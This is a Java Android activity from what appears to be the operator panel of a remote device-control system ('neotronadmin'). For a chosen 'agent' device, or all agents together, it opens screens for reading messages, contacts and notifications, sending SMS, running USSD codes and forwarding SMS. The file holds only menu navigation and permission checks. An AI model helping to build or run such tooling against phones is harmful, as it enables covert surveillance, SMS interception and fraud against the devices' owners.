package com.pegalite.neotronadmin.ui;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.pegalite.neotronadmin.databinding.ActivityViewDeviceBinding;
import com.pegalite.neotronadmin.functions.utils.Utils;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAnimationManager;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONException;
import org.json.JSONObject;

public class ViewDeviceActivity extends PegaAppCompatActivity {

    ActivityViewDeviceBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityViewDeviceBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        if (Utils.exp == null) {
            finishAffinity();
            return;
        }

        String agentID = getIntent().getStringExtra("agentID");
        if (agentID == null) {
            finish();
            return;
        }

        loadConfigs();

        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.messages.setOnClickListener(v -> {
            if (!isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, MessagesActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });

        binding.contacts.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.contacts);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            if (!isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, ContactsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });

        binding.sendMessage.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.sendMessage);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            if (!isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, SendMessageActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.details.setOnClickListener(v -> {
            if (!isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, ViewDetailsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.runUssdCode.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.runUssdCode);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            if (!isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, RunUSSDCodeActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.notifications.setOnClickListener(v -> {
            if (!isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, NotificationsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.addSMSForwarding.setOnClickListener(v -> {
            if (!isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, SmsForwardingActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });


    }

    private boolean isActive(View v) {
        String title = ((TextView) ((LinearLayout) v).getChildAt(1)).getText().toString();
        if (title.contains("Forwarding")) {
            title = "SMS Forwarding";
        }
        return configs.optBoolean(title, false);
    }

    JSONObject configs;

    private void loadConfigs() {
        try {
            configs = new JSONObject(Utils.ADMIN_CONFIGS);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }
}